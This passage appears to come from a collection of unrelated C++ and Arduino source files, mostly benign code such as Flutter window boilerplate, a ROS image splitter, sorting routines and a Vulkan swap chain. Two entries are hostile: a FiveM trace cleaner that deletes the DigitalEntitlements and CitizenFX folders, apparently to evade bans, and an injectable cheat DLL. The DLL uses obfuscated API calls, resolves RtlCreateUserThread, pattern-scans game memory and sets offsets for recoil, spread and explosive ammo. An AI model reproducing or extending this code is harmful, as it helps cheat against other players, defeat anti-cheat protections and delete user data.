cv_ptr->image.clone();\n            cv::cvtColor(cv_ptr->image, processed_image, cv::COLOR_RGB2BGR);\n        } else if (msg->encoding == \"rgba8\") {\n            // Assume the source is BGR if not grayscale and not YUY2. Adjust if your camera uses RGB.\n            // processed_image = cv_ptr->image.clone();\n            cv::cvtColor(cv_ptr->image, processed_image, cv::COLOR_RGBA2BGR);\n        } else{\n            processed_image = cv_ptr->image.clone();\n        }\n\n        // Additional check for grayscale conversion\n        if (is_grey_) {\n            if (processed_image.channels() > 1) {\n                // Convert BGR  to Grayscale\n                cv::cvtColor(processed_image, processed_image, cv::COLOR_BGR2GRAY);\n            }\n        } else if (processed_image.empty()) {\n            // For cases where the encoding is not 'yuv422_yuy2' but still color\n            processed_image = cv_ptr->image.clone();\n        }\n\n        // Split the image into left and right halves\n        int width = processed_image.cols / 2;\n        int height = processed_image.rows;\n\n        cv::Mat right_image = processed_image(cv::Rect(0, 0, width, height));\n        cv::Mat left_image = processed_image(cv::Rect(width, 0, width, height));\n\n        // Set the appropriate encoding for publishing\n        std::string encoding = is_grey_ ? \"mono8\" : \"bgr8\";\n\n        // Publish the left and right images\n        cv_bridge::CvImage left_msg(cv_ptr->header, encoding, left_image);\n        cv_bridge::CvImage right_msg(cv_ptr->header, encoding, right_image);\n\n        left_publisher_->publish(*left_msg.toImageMsg());\n        right_publisher_->publish(*right_msg.toImageMsg());\n    }\n\n  rclcpp::Subscription<sensor_msgs::msg::Image>::SharedPtr subscription_;\n  rclcpp::Publisher<sensor_msgs::msg::Image>::SharedPtr left_publisher_;\n  rclcpp::Publisher<sensor_msgs::msg::Image>::SharedPtr right_publisher_;\n  bool is_grey_; // Flag indicating if the input images are grayscale\n};\n\n#include \"rclcpp_components/register_node_macro.hpp\"\nRCLCPP_COMPONENTS_REGISTER_NODE(StereoImageSplitter)\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bmi_cal\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"trace.hpp\"\r\n\r\nvoid trace::setup()\r\n{\r\n\t// Locate Appdata\r\n\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\tstd::string localappdata = getenv(\"APPDATA\");\r\n\r\n\t// Locate DigitalElements\r\n\tappdata = appdata + \"\\\\\" + \"DigitalEntitlements\";\r\n\tif(std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n\r\n\t// Locate CitizenFX\r\n\tappdata = localappdata + \"\\\\\" + \"CitizenFX\";\r\n\tif (std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n}\r\n\r\nINT CALLBACK browse_callback_proc(HWND hwnd, UINT uMsg, LPARAM lp, LPARAM pData)\r\n{\r\n\tif (uMsg == BFFM_INITIALIZED) SendMessage(hwnd, BFFM_SETSELECTION, TRUE, pData);\r\n\treturn 0;\r\n}\r\n\r\nvoid trace::destroy()\r\n{\r\n\tm_fivem_path.clear();\r\n\tstd::remove(m_save_path.c_str());\r\n}\r\n\r\nstd::string trace::set_folder(std::string title)\r\n{\r\n\tstd::ifstream path(m_save_path);\r\n\tif (!path.good())\r\n\t{\r\n\t\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\t\tauto fivem_path = appdata + \"\\\\\" + \"FiveM\";\r\n\r\n\t\tBROWSEINFO br;\r\n\t\tZeroMemory(&br, sizeof(BROWSEINFO));\r\n\t\tbr.lpfn = browse_callback_proc;\r\n\t\tbr.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;\r\n\t\tbr.hwndOwner = NULL;\r\n\t\tbr.lpszTitle = title.c_str();\r\n\t\tbr.lParam = (LPARAM)fivem_path.c_str();\r\n\r\n\t\tstd::string ret;\r\n\r\n\t\tLPITEMIDLIST pidl = NULL;\r\n\t\tif ((pidl = SHBrowseForFolder(&br)) != NULL)\r\n\t\t{\r\n\t\t\tchar buffer[_MAX_PATH];\r\n\t\t\tif (SHGetPathFromIDList(pidl, buffer)) ret = buffer;\r\n\t\t}\r\n\r\n\t\tif (!std::filesystem::exists(ret + \"\\\\\" + \"FiveM.exe\"))\r\n\t\t{\r\n\t\t\treturn std::string();\r\n\t\t}\r\n\r\n\t\tif (!ret.empty())\r\n\t\t{\r\n\t\t\tstd::ofstream save_path(m_save_path);\r\n\t\t\tsave_path << ret << std::endl;\r\n\t\t\tsave_path.close();\r\n\t\t}\r\n\r\n\t\treturn ret;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::string name;\r\n\t\tpath >> name;\r\n\t\treturn name;\r\n\t}\r\n}\r\n\r\n\r\nvoid trace::set_launch_build()\r\n{\r\n\tint choice;\r\n\r\n\tstd::vector<const char*> m_builds = { \"2545\", \"2372\", \"2189\", \"2060\", \"1604\" };\r\n\r\n\tfor (int i = 0; i < m_builds.size(); i++)\r\n\t{\r\n\t\tstd::cout << \"  [\" << i + 1 << \"]  :  \" << m_builds[i] << std::endl;\r\n\t}\r\n\tstd::cin >> choice;\r\n\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tWritePrivateProfileString(\"Game\", \"SavedBuildNumber\", m_builds[choice - 1], path);\r\n\t}\r\n}\r\n\r\nstd::string trace::get_launch_build()\r\n{\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\tauto buildNumber = 0;\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tbuildNumber = GetPrivateProfileInt(\"Game\", \"SavedBuildNumber\", buildNumber, path);\r\n\t}\r\n\treturn std::to_string(buildNumber);\r\n}\r\n\r\n\r\n",
    "//*****************************************************************************************************\n//\n//      The implementation of the Stock class header file.\n//\n//      Other files required:\n//        1.    stock.h - header file for the Stock class\n//\n//*****************************************************************************************************\n\n#include \"stock.h\"\n#include <iostream>\n\n//*****************************************************************************************************\n\nStock::Stock(const std::string &name, const std::string &symbol, double price) {\n    companyName = name;\n    stockSymbol = symbol;\n    stockPrice = price;\n}\n\n//*****************************************************************************************************\n\nStock::Stock(const Stock &s) {\n    companyName = s.companyName;\n    stockSymbol = s.stockSymbol;\n    stockPrice = s.stockPrice;\n}\n\n//*****************************************************************************************************\n\nstd::ostream &operator<<(std::ostream &out, const Stock &stock) {\n    out << stock.companyName << std::endl\n        << stock.stockSymbol << std::endl\n        << stock.stockPrice;\n\n    return out;\n}\n\n//*****************************************************************************************************",
    "#include <SoftwareSerial.h>\n\nSoftwareSerial nodemcu(2,3);\n#include <Servo.h>\n#include <LiquidCrystal_I2C.h>\n\nLiquidCrystal_I2C lcd(0x27, 16, 2);\nServo myservo1;\nint IR1 = A0;\nint IR2 = A1;\n\nint Slot = 2;\nbool flag1 = false;\nbool flag2 = false;\nint parking1_slot1_ir_s = 4; // parking slot1 infrared sensor connected with pin number 4 of arduino\nint parking1_slot2_ir_s = 7;\n\nString sensor1;\nString sensor2;\n\n\nString cdata =\"\"; // complete data, consisting of sensors values\n\nvoid setup()\n{\n   lcd.begin(16, 2);\n  lcd.backlight();\nSerial.begin(9600);\nnodemcu.begin(9600);\n\npinMode(parking1_slot1_ir_s, INPUT);\npinMode(parking1_slot2_ir_s, INPUT);\npinMode(IR1, INPUT);\n  pinMode(IR2, INPUT);\n\n  myservo1.attach(10);\n  myservo1.write(0);\n\n   lcd.setCursor(0, 0);\n    lcd.print(\"   ARDUINO  \");\n    lcd.setCursor(0, 1);\n    lcd.print(\"PARKING SYSTEM \");\n    delay(2000);\n    lcd.clear();\n\n}\n\nvoid loop()\n{\n\np1slot1();\np1slot2();\n\n \n \n   cdata = cdata + sensor1 +\",\" + sensor2 + \",\"; // comma will be used a delimeter\n   Serial.println(cdata);\n   nodemcu.println(cdata);\n   delay(6000); // 100 milli seconds\n   cdata = \"\";\ndigitalWrite(parking1_slot1_ir_s, HIGH);\ndigitalWrite(parking1_slot2_ir_s, HIGH);\n\n if (digitalRead(IR1) == LOW && !flag1) {\n    if (Slot > 0) {\n      flag1 = true;\n      myservo1.write(90);\n      Slot--;\n    } else {\n      lcd.setCursor(0, 0);\n      lcd.print(\"   SORRY :(  \");\n      lcd.setCursor(0, 1);\n      lcd.print(\" Parking Full \");\n      delay(3000);\n      lcd.clear();\n    }\n  }\n\n  if (digitalRead(IR2) == LOW && !flag2) {\n    flag2 = true;\n    myservo1.write(0);\n    Slot++;\n  }\n\n  lcd.setCursor(0, 0);\n  lcd.print(\"WELCOME!\");\n  lcd.setCursor(0, 1);\n  lcd.print(\"Slot left:\");\n  lcd.print(Slot);\n}\n\n\nvoid p1slot1() // parkng 1 slot1\n{\n  if( digitalRead(parking1_slot1_ir_s) == LOW)\n  {\n  sensor1 = \"255\";\n delay(200);\n  }\nif( digitalRead(parking1_slot1_ir_s) == HIGH)\n{\n  sensor1 = \"0\"; \n delay(200); \n}\n\n}\n\nvoid p1slot2() // parking 1 slot2\n{\n  if( digitalRead(parking1_slot2_ir_s) == LOW)\n  {\n  sensor2 = \"255\";\n  delay(200);\n  }\nif( digitalRead(parking1_slot2_ir_s) == HIGH) \n  {\n  sensor2 = \"0\"; \n delay(200);\n  }\n}",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <algorithm>\n#include <format>\n#include \"ListOperationsKit.h\"\n\nvoid quick_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if(begin < end) {\n        int i = begin, j = end, pivot = list.get(begin);\n        do {\n            while (list[i] < pivot) ++i;\n            while (list[j] > pivot) --j;\n            if (i <= j) {\n                list.swap(i, j);\n                ++i;\n                --j;\n            }\n        } while(i <= j);\n        quick_sort(begin, j, list);\n        quick_sort(i, end, list);\n    }\n}\n\nvoid merge(int begin, int mid, int end, ListOperationsKit<int>& list) {\n    int i = begin, j = mid + 1, k = 0;\n    ListOperationsKit<int> temp;\n    while (i <= mid && j <= end) {\n        if (list.get(i) < list[j]) {\n            temp.append(list[i]);\n            ++i;\n        } else {\n            temp.append(list[j]);\n            ++j;\n        }\n    }\n    while (i <= mid) {\n        temp.append(list[i]);\n        ++i;\n    }\n    while (j <= end) {\n        temp.append(list[j]);\n        ++j;\n    }\n    for (int n = begin; n <= end; ++n) {\n        list[n] = temp[k];\n        ++k;\n    }\n}\n\nvoid merge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (begin < end) {\n        int mid = (begin + end) / 2;\n        merge_sort(begin, mid, list);\n        merge_sort(mid + 1, end, list);\n        merge(begin, mid, end, list);\n    }\n}\n\nvoid stooge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (list.get(begin) > list(end)) {\n        list.swap(begin, end);\n    }\n    if (end - begin + 1 > 2) {\n        int t = (end - begin + 1) / 3;\n        stooge_sort(begin, end - t, list);\n        stooge_sort(begin + t, end, list);\n        stooge_sort(begin, end - t, list);\n    }\n}\n\nint main() {\n    ListOperationsKit<int> list_1, list_2, list_3;\n\n    list_1.random_append(10);\n    list_2.random_append(10, 2, 50);\n    list_3.append(99, 53, 21, 8, 9, 10, 11, 12, 65, 94);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    std::cout << std::endl;\n\n    quick_sort(0, list_1.length(), list_1);\n    merge_sort(0, list_2.length(), list_2);\n    stooge_sort(0, list_3.length(), list_3);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    return 0;\n}",
    "#include \"vkm_swap_chain.h\"\n// std\n#include <array>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <limits>\n#include <set>\n#include <stdexcept>\n\nnamespace vkm {\n\nVkmSwapChain::VkmSwapChain(VkmDevice &deviceRef, VkExtent2D extent)\n    : device{deviceRef}, windowExtent{extent} {\n  createSwapChain();\n  createImageViews();\n  createRenderPass();\n  createDepthResources();\n  createFramebuffers();\n  createSyncObjects();\n}\n\nVkmSwapChain::~VkmSwapChain() {\n  for (auto imageView : swapChainImageViews) {\n    vkDestroyImageView(device.device(), imageView, nullptr);\n  }\n  swapChainImageViews.clear();\n\n  if (swapChain != nullptr) {\n    vkDestroySwapchainKHR(device.device(), swapChain, nullptr);\n    swapChain = nullptr;\n  }\n\n  for (int i = 0; i < depthImages.size(); i++) {\n    vkDestroyImageView(device.device(), depthImageViews[i], nullptr);\n    vkDestroyImage(device.device(), depthImages[i], nullptr);\n    vkFreeMemory(device.device(), depthImageMemorys[i], nullptr);\n  }\n\n  for (auto framebuffer : swapChainFramebuffers) {\n    vkDestroyFramebuffer(device.device(), framebuffer, nullptr);\n  }\n\n  vkDestroyRenderPass(device.device(), renderPass, nullptr);\n\n  // cleanup synchronization objects\n  for (size_t i = 0; i < MAX_FRAMES_IN_FLIGHT; i++) {\n    vkDestroySemaphore(device.device(), renderFinishedSemaphores[i], nullptr);\n    vkDestroySemaphore(device.device(), imageAvailableSemaphores[i], nullptr);\n    vkDestroyFence(device.device(), inFlightFences[i], nullptr);\n  }\n}\n\nVkResult VkmSwapChain::acquireNextImage(uint32_t *imageIndex) {\n  vkWaitForFences(\n      device.device(),\n      1,\n      &inFlightFences[currentFrame],\n      VK_TRUE,\n      std::numeric_limits<uint64_t>::max());\n\n  VkResult result = vkAcquireNextImageKHR(\n      device.device(),\n      swapChain,\n      std::numeric_limits<uint64_t>::max(),\n      imageAvailableSemaphores[currentFrame],  // must be a not signaled semaphore\n      VK_NULL_HANDLE,\n      imageIndex);\n\n  return result;\n}\n\nVkResult VkmSwapChain::submitCommandBuffers(\n    const VkCommandBuffer *buffers, uint32_t *imageIndex) {\n  if (imagesInFlight[*imageIndex] != VK_NULL_HANDLE) {\n    vkWaitForFences(device.device(), 1, &imagesInFlight[*imageIndex], VK_TRUE, UINT64_MAX);\n  }\n  imagesInFlight[*imageIndex] = inFlightFences[currentFrame];\n\n  VkSubmitInfo submitInfo = {};\n  submitInfo.sType = VK_STRUCTURE_TYPE_SUBMIT_INFO;\n\n  VkSemaphore waitSemaphores[] = {imageAvailableSemaphores[currentFrame]};\n  VkPipelineStageFlags waitStages[] = {VK_PIPELINE_STAGE_COLOR_ATTACHMENT_OUTPUT_BIT};\n  submitInfo.waitSemaphoreCount = 1;\n  submitInfo.pWaitSemaphores = waitSemaphores;\n  submitInfo.pWaitDstStageMask = waitStages;\n\n  submitInfo.commandBufferCount = 1;\n  submitInfo.pCommandBuffers = buffers;\n\n  VkSemaphore signalSemaphores[] = {renderFinishedSemaphores[currentFrame]};\n  submitInfo.signalSemaphoreCount = 1;\n  submitInfo.pSignalSemaphores = signalSemaphores;\n\n  vkResetFences(device.device(), 1, &inFlightFences[currentFrame]);\n  if (vkQueueSubmit(device.graphicsQueue(), 1, &submitInfo, inFlightFences[currentFrame]) !=\n      VK_SUCCESS) {\n    throw std::runtime_error(\"failed to submit draw command buffer!\");\n  }\n\n  VkPresentInfoKHR presentInfo = {};\n  presentInfo.sType = VK_STRUCTURE_TYPE_PRESENT_INFO_KHR;\n\n  presentInfo.waitSemaphoreCount = 1;\n  presentInfo.pWaitSemaphores = signalSemaphores;\n\n  VkSwapchainKHR swapChains[] = {swapChain};\n  presentInfo.swapchainCount = 1;\n  presentInfo.pSwapchains = swapChains;\n\n  presentInfo.pImageIndices = imageIndex;\n\n  auto result = vkQueuePresentKHR(device.presentQueue(), &presentInfo);\n\n  currentFrame = (currentFrame + 1) % MAX_FRAMES_IN_FLIGHT;\n\n  return result;\n}\n\nvoid VkmSwapChain::createSwapChain() {\n  SwapChainSupportDetails swapChainSupport = device.getSwapChainSupport();\n\n  VkSurfaceFormatKHR surfaceFormat = chooseSwapSurfaceFormat(swapChainSupport.formats);\n  VkPresentModeKHR presentMode = chooseSwapPresentMode(swapChainSupport.presentModes);\n  VkExtent2D extent = chooseSwapExtent(swapChainSupport.capabilities);\n\n  uint32_t imageCount = swapChainSupport.capabilities.minImageCount + 1;\n  if (swapChainSupport.capabilities.maxImageCount > 0 &&\n      imageCount > swapChainSupport.capabilities.maxImageCount) {\n    imageCount = swapChainSupport.capabilities.maxImageCount;\n  }\n\n  VkSwapchainCreateInfoKHR createInfo = {};\n  createInfo.sType = VK_STRUCTURE_TYPE_SWAPCHAIN_CREATE_INFO_KHR;\n  createInfo.surface = device.surface();\n\n  createInfo.minImageCount = imageCount;\n  createInfo.imageFormat = surfaceFormat.format;\n  createInfo.imageColorSpace = surfaceFormat.colorSpace;\n  createInfo.imageExtent = extent;\n  createInfo.imageArrayLayers = 1;\n  createInfo.imageUsage = VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT;\n\n  QueueFamilyIndices indices = device.findPhysicalQueueFamilies();\n  uint32_t queueFamilyIndices[] = {indices.graphicsFamily, indices.presentFamily};\n\n  if (indices.graphicsFamily != indices.presentFamily) {\n    createInfo.imageSharingMode = VK_SHARING_MODE_CON",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  